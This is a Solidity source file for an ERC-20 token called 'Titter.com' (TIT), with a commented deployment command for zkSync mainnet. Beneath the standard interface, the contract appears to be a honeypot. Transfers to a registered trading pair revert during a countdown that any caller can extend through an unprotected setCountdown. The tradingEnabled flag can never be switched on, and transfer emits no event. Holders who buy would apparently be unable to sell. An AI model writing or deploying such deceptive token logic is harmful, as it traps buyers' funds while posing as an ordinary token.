// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
* Titter.com
*/

// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol


//forge script script/BunsDeploy.s.sol:BunsDeploy --rpc-url https://mainnet.era.zksync.io --ledger --hd-paths "m/44'/60'/2'/0/0" --sender 0x65D23339193876B27f80dD3b685111F9B4328f20 -vvvv --legacy --broadcast


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.17;

contract Titter is IERC20 {
    uint256 public totalSupply = 100_000_000e18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Titter.com";
    string public symbol = "TIT";
    uint8 public decimals = 18;
    bool public tradingEnabled;
    address public owner;
    uint256 public countdown;

    mapping(address => bool) public isPair;
    mapping(uint256 => address) public pairAddress;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        countdown = block.timestamp + 7 days;
    }

    function setPair(address _pair, bool _bool) external {
        require(msg.sender == owner, "Not allowed");
        isPair[_pair] = _bool;
        pairAddress[0] = _pair;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (isPair[to] == true) {
            if (block.timestamp <= countdown) {
                revert("Please wait until countdown ends");
            } else {
                allowance[from][msg.sender] -= amount;
                balanceOf[from] -= amount;
                balanceOf[to] += amount;
            }
        } else if (tradingEnabled || from == owner || to == owner) {
            allowance[from][msg.sender] -= amount;
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        } else {
            revert("Trading is not enabled yet");
        }

        emit Transfer(from, to, amount);
        return true;
    }

    function setCountdown(uint time) external {
        countdown = block.timestamp + time;
    }
}